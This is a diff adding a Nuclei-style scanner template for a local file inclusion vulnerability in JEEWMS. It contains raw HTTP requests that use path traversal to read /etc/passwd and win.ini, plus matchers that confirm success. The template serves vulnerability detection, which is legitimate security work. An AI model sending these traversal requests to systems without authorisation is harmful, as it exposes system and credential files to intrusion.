@@ -1,0 +1,41 @@
+id: jeewms-lfi
+
+info:
+  name: JEEWMS - Local File Inclusion
+  author: pikpikcu
+  severity: high
+  description: JEEWMS is vulnerable to local file inclusion.
+  reference:
+    - https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: jeewms,lfi
+
+http:
+  - raw:
+      - | #linux
+        GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+      - | #windows
+        GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100b1faf2b55b059710a4226e9e9fbc9bcb3ce8d9151f0657d533b0f5161924191902203aae3e26ecd879ae6e59897e42df46b2becaa81e5121f486e754dcc1c77cc2af:922c64590222798bb761d5b6d8e72950
